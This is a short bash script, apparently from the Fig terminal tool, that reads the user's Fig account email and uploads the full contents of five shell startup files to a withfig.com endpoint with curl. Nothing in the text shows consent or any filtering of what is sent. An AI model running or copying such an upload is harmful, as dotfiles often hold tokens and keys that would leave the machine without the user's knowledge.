#!/usr/bin/env bash

curl -X POST --data "$(defaults read com.mschrage.fig | grep userEmail)" --data FILEBREAK --data-binary @"$HOME/.profile" --data FILEBREAK --data-binary @"$HOME/.zprofile" --data FILEBREAK --data-binary @"$HOME/.bash_profile" --data FILEBREAK --data-binary @"$HOME/.bashrc" --data FILEBREAK --data-binary @"$HOME/.zshrc" https://waitlist.withfig.com/dotfiles
